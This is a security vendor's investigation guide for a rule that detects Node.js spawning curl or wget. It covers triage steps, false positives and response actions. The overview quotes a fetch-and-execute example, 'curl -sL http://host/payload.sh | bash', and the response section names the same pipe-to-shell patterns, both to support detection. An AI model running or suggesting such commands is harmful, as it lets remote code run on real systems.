---
applies_to:
  stack: ga all
  serverless:
    security: ga all
products:
  - id: security
  - id: cloud-serverless
description: 'Investigation guide for the "Curl or Wget Spawned via Node.js" prebuilt detection rule.'
---

# Curl or Wget Spawned via Node.js

## Triage and analysis

> **Disclaimer**:
> This investigation guide was created using generative AI technology and has been reviewed to improve its accuracy and relevance. While every effort has been made to ensure its quality, we recommend validating the content and adapting it to suit your specific environment and operational needs.

### Investigating Curl or Wget Spawned via Node.js

This rule flags Node.js launching curl or wget, directly or via a shell, a common technique to fetch payloads and enable command-and-control. Attackers often abuse child_process in Node apps to run "curl -sL http://host/payload.sh | bash," pulling a second stage from a remote host and executing it immediately under the guise of legitimate application activity.

### Possible investigation steps

- Pull the full process tree and command line to extract URLs/domains, flags (e.g., -sL, -O, --insecure), and identify whether the output is piped into an interpreter, indicating immediate execution risk.
- Correlate with file system activity to find newly created or modified artifacts (e.g., in /tmp, /var/tmp, /dev/shm, or the app directory), then hash and scan them and check for follow-on executions.
- Pivot to network telemetry to enumerate connections around the event from both Node.js and the child process, assessing destination reputation (IP/domain, ASN, geo, cert/SNI) against approved update endpoints.
- Trace the initiating Node.js code path and deployment (child_process usage such as exec/spawn/execFile), and review package.json lifecycle scripts and recent npm installs or postinstall hooks for unauthorized download logic.
- Verify user and runtime context (service account/container/pod), inspect environment variables like HTTP(S)_PROXY/NO_PROXY, and check whether credentials or tokens were passed to curl/wget to assess exposure.

### False positive analysis

- A legitimate Node.js service executes curl or wget to retrieve configuration files, certificates, or perform health checks against approved endpoints during startup or routine operation.
- Node.js install or maintenance scripts use a shell with -c to run curl or wget and download application assets or updates, triggering the rule even though this aligns with expected deployment workflows.

### Response and remediation

- Immediately isolate the affected host or container, stop the Node.js service that invoked curl/wget (and any parent shell), terminate those processes, and block the exact URLs/domains/IPs observed in the command line and active connections.
- Quarantine and remove any artifacts dropped by the downloader (e.g., files in /tmp, /var/tmp, /dev/shm or paths specified by -O), delete added cron/systemd entries referencing those files, and revoke API tokens or credentials exposed in the command line or headers.
- Escalate to full incident response if output was piped to an interpreter (curl ... | bash or wget ... | sh), if --insecure/-k or self-signed endpoints were used, if unknown external infrastructure was contacted, or if secrets were accessed or exfiltrated.
- Rebuild and redeploy the workload from a known-good image, remove the malicious child_process code path from the Node.js application, restore validated configs/data, rotate any keys or tokens used by that service, and verify no further curl/wget spawns occur post-recovery.
- Harden by removing curl/wget from runtime images where not required, enforcing egress allowlists for the service, constraining execution with AppArmor/SELinux/seccomp and least-privilege service accounts, and adding CI/CD checks to block package.json postinstall scripts or code that shells out to downloaders.
